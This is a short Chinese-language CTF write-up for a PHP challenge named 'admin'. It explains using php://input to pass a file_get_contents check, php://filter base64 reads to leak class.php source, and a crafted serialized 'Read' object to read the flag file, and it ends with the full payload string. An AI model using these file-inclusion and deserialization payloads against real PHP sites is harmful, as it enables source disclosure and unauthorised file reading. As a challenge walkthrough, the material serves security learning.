admin

源码有提示，

这里想办法满足file_get_contents($user,’r’)===”the user is admin”，方法就是利用php://input,通过php输入流协议php://input来读取未经处理过的POST数据，即可。

这里已经再添加参数file即可包含到class.php,这里要用到php另一协议，php://filter/convert.base64-encode/resource=./class.php,读取到class.php的源码，

再来看看index.php,

利用正则排除了我们直接包含f1a9.php的想法，但是这里利用class.php，我们可以利用反序列化来读取flag，构造
O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}

最后我们的payload就构造成了这样：
user=php://input&file=class.php&pass=O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}
